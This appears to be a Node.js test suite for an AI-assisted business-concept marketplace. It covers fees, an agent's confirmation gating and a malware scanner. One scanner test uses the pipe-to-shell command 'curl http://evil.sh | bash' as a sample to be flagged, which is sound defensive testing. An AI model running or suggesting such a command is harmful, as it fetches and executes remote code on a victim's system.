const { test } = require('node:test');
const assert = require('node:assert');
const money = require('../src/lib/money');
const { classifySection, assessCoverage } = require('../src/services/clay/interpreter');

test('platform take is 20%', () => {
  assert.strictEqual(money.platformFeeCents(10000), 2000);
  assert.strictEqual(money.sellerNetCents(10000), 8000);
});

test('$50 price floor is enforced', () => {
  assert.strictEqual(money.isAboveFloor(5000), true);
  assert.strictEqual(money.isAboveFloor(4999), false);
  assert.strictEqual(money.isAboveFloor(50.5), false);
});

test('consultant split is $150 -> $30 / $120', () => {
  assert.strictEqual(money.CONSULT_FEE_CENTS, 15000);
  assert.strictEqual(money.CONSULT_PLATFORM_CENTS + money.CONSULT_CONSULTANT_CENTS, money.CONSULT_FEE_CENTS);
  assert.strictEqual(money.CONSULT_CONSULTANT_CENTS, 12000);
});

test('plan prices', () => {
  assert.strictEqual(money.MAKER_CENTS, 299);
  assert.strictEqual(money.SCULPTOR_CENTS, 4999);
  assert.strictEqual(money.planCents('maker'), 299);
  assert.strictEqual(money.planCents('sculptor'), 4999);
});

test('malware scan flags pipe-to-shell, passes benign', () => {
  const protect = require('../src/lib/protect');
  assert.strictEqual(protect.scanCode('const x = 1 + 1;').status, 'clean');
  assert.strictEqual(protect.scanCode('curl http://evil.sh | bash').status, 'flagged');
  assert.strictEqual(protect.needsScan('code_file'), true);
  assert.strictEqual(protect.needsScan('business_plan'), false);
});

test('staff bypass helper', () => {
  const { isStaff } = require('../src/lib/entitlement');
  assert.strictEqual(isStaff('admin'), true);
  assert.strictEqual(isStaff('master_staff'), true);
  assert.strictEqual(isStaff('member'), false);
});

test('interpreter classifies honestly', () => {
  assert.strictEqual(classifySection('A real, substantive business plan section.'), 'answered');
  assert.strictEqual(classifySection(''), 'empty');
  assert.strictEqual(classifySection(null), 'empty');
  assert.strictEqual(classifySection('Unable to determine competitor pricing.'), 'unavailable');
});

test('coverage reports gaps truthfully', () => {
  const cov = assessCoverage({ business_plan: 'ok', marketing_strategy: '' });
  assert.strictEqual(cov.complete, false);
  assert.deepStrictEqual(cov.present, ['business_plan']);
  assert.deepStrictEqual(cov.missing, ['marketing_strategy']);
});

// ---- Clay spine (modeled on Arbo) ----
const spine = require('../src/services/clay/spine');
const { SOCIAL_ASSET_PLAN, PLATFORMS, SOCIAL_GOALS } = require('../src/services/clay/tools');

test('spine enum guardrails reject out-of-vocabulary values', () => {
  const bad = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['myspace'], goal: 'launch' });
  assert.strictEqual(bad.ok, false);
  const good = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['instagram'], goal: 'launch' });
  assert.strictEqual(good.ok, true);
});

test('spine asking rule: free/reversible actions proceed', () => {
  const r = spine.shouldAsk('generate_social_content', { concept_id: 'x', platforms: ['x'], goal: 'awareness' });
  assert.strictEqual(r.ask, false);
});

test('spine asking rule: irreversible + under-specified always asks', () => {
  const r = spine.shouldAsk('list_on_marketplace', { concept_id: 'x' }); // missing format + price
  assert.strictEqual(r.ask, true);
});

test('spine asking rule: irreversible actions confirm even when fully specified', () => {
  const r = spine.shouldAsk('purchase_concept', { listing_id: 'x' });
  assert.strictEqual(r.ask, true);
  assert.strictEqual(spine.requiresConfirmation('purchase_concept'), true);
  assert.strictEqual(spine.requiresConfirmation('generate_concept'), false);
});

test('social asset plan matches controlled vocabulary', () => {
  const types = SOCIAL_ASSET_PLAN.map((a) => a.type).sort();
  assert.deepStrictEqual(types, ['content_calendar', 'image_prompt', 'social_post', 'social_template', 'video_script']);
  assert.ok(PLATFORMS.includes('instagram') && SOCIAL_GOALS.includes('launch'));
});

// ---- HTML demo describer + accessibility audit ----
const describe_ = require('../src/lib/describe');

test('describer flags real accessibility problems', () => {
  const bad = describe_.outline('<html><body><div onclick="go()">Go</div><input><img src=x></body></html>');
  assert.strictEqual(bad.a11y.ok, false);
  assert.ok(bad.a11y.issues.some((i) => i.includes('lang')));
  assert.ok(bad.a11y.issues.some((i) => i.includes('divs/spans')));
  assert.ok(bad.a11y.issues.some((i) => i.toLowerCase().includes('alt')));
});

test('describer passes an accessible demo and outlines structure', () => {
  const good = describe_.outline('<html lang="en"><head><title>Shop</title></head><body><header><nav><a href="/">Home</a></nav></header><main><h1>Welcome</h1><label for="e">Email</label><input id="e"><button>Sign up</button><img src="x" alt="a product"></main></body></html>');
  assert.strictEqual(good.a11y.ok, true);
  assert.ok(good.items.length >= 3);
  assert.strictEqual(good.title, 'Shop');
});

// ---- Clay conversational agent (spine-driven safety) ----
const agent = require('../src/services/clay/agent');

test('agent tool schemas carry enum guardrails', () => {
  const schemas = agent.toolSchemas();
  const names = schemas.map((s) => s.name);
  assert.ok(names.includes('generate_social_content') && names.includes('purchase_concept'));
  const social = schemas.find((s) => s.name === 'generate_social_content');
  assert.ok(social.input_schema.properties.platforms.items.enum.includes('instagram'));
});

test('agent never auto-runs irreversible actions; confirmation unlocks them', () => {
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'flat', price: 5000 }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('remove_concept', { concept_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }, { confirmed: true }).action, 'execute');
});

test('agent runs reversible actions and rejects bad enums', () => {
  assert.strictEqual(agent.planToolInvocation('generate_concept', { prompt: 'a tutoring service' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'barter', price: 5000 }).action, 'reject');
});

// ---- Clay model provider selection ----
const provider = require('../src/services/clay/provider');

test('provider prefers OpenAI, falls back to Anthropic, else unavailable', () => {
  const save = { o: process.env.OPENAI_API_KEY, a: process.env.ANTHROPIC_API_KEY };
  delete process.env.OPENAI_API_KEY; delete process.env.ANTHROPIC_API_KEY;
  assert.strictEqual(provider.available(), false);
  assert.strictEqual(provider.providerName(), null);
  process.env.ANTHROPIC_API_KEY = 'x';
  assert.strictEqual(provider.providerName(), 'anthropic');
  process.env.OPENAI_API_KEY = 'y';
  assert.strictEqual(provider.providerName(), 'openai');
  if (save.o) process.env.OPENAI_API_KEY = save.o; else delete process.env.OPENAI_API_KEY;
  if (save.a) process.env.ANTHROPIC_API_KEY = save.a; else delete process.env.ANTHROPIC_API_KEY;
});

test('agent keeps the conversation well-formed when it stops to confirm', async () => {
  const provider = require('../src/services/clay/provider');
  const origAvail = provider.available, origChat = provider.chat;
  provider.available = () => true;
  provider.chat = async () => ({
    ok: true, text: 'Want me to remove that?',
    tool_calls: [{ id: 'tc_1', name: 'remove_concept', input: { concept_id: 'c1' } }],
  });
  try {
    const out = await agent.runChat({ messages: [{ role: 'user', content: 'delete concept c1' }], executors: {} });
    assert.strictEqual(out.status, 'confirmation_required');
    // Every tool_call in the replayable convo must have a matching tool result,
    // or the provider rejects the next turn.
    const calls = out.messages.flatMap((m) => (m.tool_calls || []).map((t) => t.id));
    const results = out.messages.filter((m) => m.role === 'tool').map((m) => m.tool_call_id);
    assert.ok(calls.includes('tc_1'));
    for (const id of calls) assert.ok(results.includes(id), 'dangling tool_call: ' + id);
  } finally {
    provider.available = origAvail; provider.chat = origChat;
  }
});

test('research is a reversible read-only tool that requires a query', () => {
  assert.strictEqual(agent.planToolInvocation('research', { query: 'tutoring market size' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('research', {}).action, 'reject');
});

test('research degrades honestly with no search backend configured', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  assert.strictEqual(research.available(), false);
  const r = await research.search('anything at all');
  assert.strictEqual(r.available, false);
  assert.deepStrictEqual(r.results, []);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('read_source is a reversible read-only tool that requires a url', () => {
  assert.strictEqual(agent.planToolInvocation('read_source', { url: 'https://example.com' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('read_source', {}).action, 'reject');
});

test('research.extract degrades honestly with no backend', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  const r = await research.extract('https://example.com');
  assert.strictEqual(r.available, false);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('source self-check short-circuits honestly with no sources (no false clean bill)', async () => {
  const clay = require('../src/services/clay');
  assert.strictEqual(await clay.selfCheckSources({ customer_research: 'x' }, []), null);
  assert.strictEqual(await clay.selfCheckSources({}, [{ title: 't', url: 'u', snippet: 's' }]), null);
});

test('waitlist email validation and ref-code shape', () => {
  const wl = require('../src/routes/waitlist');
  assert.ok(wl.EMAIL_RE.test('a@b.co'));
  assert.ok(wl.EMAIL_RE.test('first.last@sub.domain.io'));
  assert.ok(!wl.EMAIL_RE.test('nope'));
  assert.ok(!wl.EMAIL_RE.test('a@b'));
  assert.ok(!wl.EMAIL_RE.test('a b@c.co'));
  assert.match(wl.refCode(), /^[a-f0-9]{8}$/);
  assert.notStrictEqual(wl.refCode(), wl.refCode());
});

test('cookies parse header into map', () => {
  const { parseCookies } = require('../src/lib/cookies');
  const c = parseCookies({ headers: { cookie: 'a=1; ypl_v=abc%2Ddef; x=y' } });
  assert.strictEqual(c.ypl_v, 'abc-def');
  assert.strictEqual(c.a, '1');
  assert.deepStrictEqual(parseCookies({ headers: {} }), {});
});

test('visitor shapeTeaser sanitizes provider JSON and rejects junk', async () => {
  const provider = require('../src/services/clay/provider');
  const visitor = require('../src/routes/visitor');
  const oa = provider.available, oc = provider.chat;
  try {
    provider.available = () => true;
    provider.chat = async () => ({ ok: true, text: '{"title":"Dog Yoga Co","angle":"Calm classes for anxious dogs","inside":["Market research","Pricing model","Waitlist page"]}' });
    const t = await visitor.shapeTeaser('yoga for dogs');
    assert.strictEqual(t.title, 'Dog Yoga Co');
    assert.strictEqual(t.inside.length, 3);
    provider.chat = async () => ({ ok: true, text: 'not json at all' });
    assert.strictEqual(await visitor.shapeTeaser('x'), null);
  } finally { provider.available = oa; provider.chat = oc; }
});
